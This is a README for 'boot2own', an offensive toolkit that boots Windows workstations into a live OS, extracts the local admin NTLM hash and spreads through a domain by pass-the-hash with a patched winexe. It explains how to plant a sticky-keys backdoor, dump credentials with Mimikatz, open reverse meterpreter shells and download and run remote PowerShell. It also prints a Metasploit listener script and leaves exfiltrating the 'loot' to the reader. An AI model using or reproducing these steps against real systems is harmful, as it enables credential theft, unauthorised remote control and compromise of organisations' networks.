# The boot2own toolkit

B2O is a toolkit that generates a live OS from a crunchbang 
iso. When a workstation is booted to this live environment 
it's hard drive is mounted and the NTLM hash of the 
local admin (RID 500) is extracted. The admin hash is then 
leveraged in attacks against a Windows domain network using a
patched winexe binary.

Used crunchbang-11-20130506-i686.iso successfully to
generate liveCD.

Used Ubuntu Server x86 12.04 successfully to compile patched winexe
So use Ubuntu Server/Desktop x86 12.04 to compile binary for i686 
crunchbang iso.

Confirmed working on Windows 7 only.

### TODO 
* Add Plop boot manager to PXE generation script.
* have Ramboot/Copy2ram functionality to generated iso, to aid live USB function.
* Add additonal payloads
* Add UEFI support (meaning there is no current UEFI support)

## Demo
The following link has a demo iso that was generated with this kit.
Don't take my word for it and test it in a Windows VM that is apart
of a virtualized test domain.

[Get demo here](http://www.mediafire.com/download/x18jv9h8voxh7jl/boot2own-demo.iso).

create an issue through github if you have any problems.

## Video
Watch it in HD to see the details.

[![video hosted on youtube here](http://img.youtube.com/vi/vUvku_CwKT0/hqdefault.jpg)](https://www.youtube.com/embed/vUvku_CwKT0?autoplay=1&vq=hd720)

## Build Scripts
Run these scripts inside the boot2own/ folder to prevent
any odd issue from appearing.
* b2o-compile.sh - compiles a patched winexe binary
* b2o-isogen.sh  - generates the live environment from a CrunchBang iso
* b2o-pxe.sh     - sets up a pxe server using the newly generated iso

## Compile winexe
Insure that you are using a x86 Ubuntu 12.04 / Crunchbang computer for 
compiling winexe for the x86 LiveCD. 

First you need to compile a patched winexe version that allows 
hash passing. Use the following script inside the boot2own-1.0 folder.
```
 usage : ./b2o-compile.sh 
```
If you already have a copy of smbexec installed, rename a 
copied smbwinexe to pwinexe and place it in.

boot2own/live-files/boot-2-own/pwinexe

Note: a x64 binary will not work.

## Generate iso image
To generate a boot2own liveCD for yourself you will need to have 
a copy of a Crunchbang iso. The build scripts have been sucessfully 
tested on image crunchbang-11-20130506-i686.iso  

to generate the boot2own live OS from the crunchbange iso use
the following script with the CB iso as an argument.
```
 usage: ./b2o-isogen.sh crunchbang-11-20130506-i686.iso
```
This will remaster the crunchbang iso to become the b2o live OS.
the iso will be saved to boot2own/b2o-remaster/boot2own.iso


## PXE Server
sets up a pxe server on a Beagle Bone black, 
Raspberry Pi or any hardware that has a Debian based OS.
The script installs syslinux, dnsmasq and configures it to run 
as a PXE server. It then extracts the needed files from the 
boot2own.iso image file in order to boot it with PXE over a LAN.

It is preferable to use a device that has a gigabit Ethernet port.

To install run as ROOT
```
 ./b2o-pxe.sh boot2own.iso
```
Default network settings in b2o-pxe.sh

eth0    10.0.0.1
netmask 255.255.255.0

# Live Environment Options

Tested on hard drives with Windows 7 installed. 
* If the hard drive is encrypted B2O will fail. 
* If no Windows file system is detected the LiveCD OS will power off.

Boot computer by USB/CD/PXE
You will then be presented with the following options.

## [1] Sethc Backdoor
This option overwrites sethc.exe with cmd.exe, 
known as the sticky keys bypass. This enables one to 
activate a system cmd prompt when pressing the Shift 
keys 5 times at the Windows login screen. To reverse 
the process just run this option again on the same 
computer.

## [2] Mimikatz
Option named after the program Mimikatz. It is delivered 
using a PowerShell script "Invoke-Mimikatz" (part of the 
PowerSploit toolkit) that loads the program reflectively 
into memory and then executes it, giving you clear text 
credentials. For more info read the contents of 
boot2own/live-files/pld2, also visit the program authors 
blog and the Github repo that host PowerSploit(read ABOUT CREDITS-B2O). 
The Output from this option is stored in a file [ /root/loot ] 

## [3] Invoke-Shellcode
A script that is apart of PowerSploit toolkit, executes 
a reverse https meterpreter shell back to the specified IP 
or domain. For this to work you will need to use the 
MetaSploit Framework to have a multi handler ready and 
waiting for a connection.

Setting up the multi handler:

Use an metasploit rc script

```
use multi/handler
set payload windows/meterpreter/reverse_https
set LHOST "YOUR IP OR DOMAIN" 
set LPORT 443
set ExitOnSession false
set AutoRunScript post/windows/manage/system_migrate
exploit -j
```
execute this file 
msfconsole -r listener.rc       

Note : system_migrate
system_migrate is a modified version of smart_migrate, it's 
priority is to migrate out of powershell to an existing 
SYSTEM/NT AUTHORITY process to maintain this permissions level. 
If this is not done The patched winexe process will hang as 
powershell remains active.

to get this moded module working copy system_migrate.rb to

metasploit-framework/modules/post/windows/manage/

Do not forget to check permissions.

b2o-listener.sh 
Optional - if you already have the metasploit-framework 
installed and it is in your terminals PATH along with 
having the system_migrate.rb in the appropriate directory. 
You can use this shell script to start MSF and drop 
you directly into a multi handler configured to 
receive shells from b2o's option 3.
```
usage : ./b2o-listener.sh lhost-IP
```
Note : Invoke-Shellcode
For author info and program details read the ABOUT 
and CREDITS-B2O.

Note : Proxies
SYSTEM will ignore IE proxy settings so if a network uses 
a web application proxy (has good egress filtering)
you will not get your shell and may possibly hang up 
a B2O execution run.


## [4] PS URL
This option passes a powershell command string that downloads 
the contents of a target url to a powershell variable and 
then invokes the variable contents as an expression "IEX". 
This can be leveraged by your own custom powershell script 
that you wish to be executed remotely there is no need to 
enable remoting as you are passing the parameters 
through the patched winexe program.

## [5] Windows cli
This option passes a command that is executed directly by 
winexe on victim machines, this option is whatever you make it.

## [6] Show Credits
Shows Credits

## [7] Shut Down Live session
Self explanitory

## EXFILTRATION

For the payload options [ 2 - 5 ]
the output/result of each successful execution run is saved in a file

located: /root/loot (in the Live OS)
how to exfil it, is up to you.

For ideas look at my git repo black-hole.
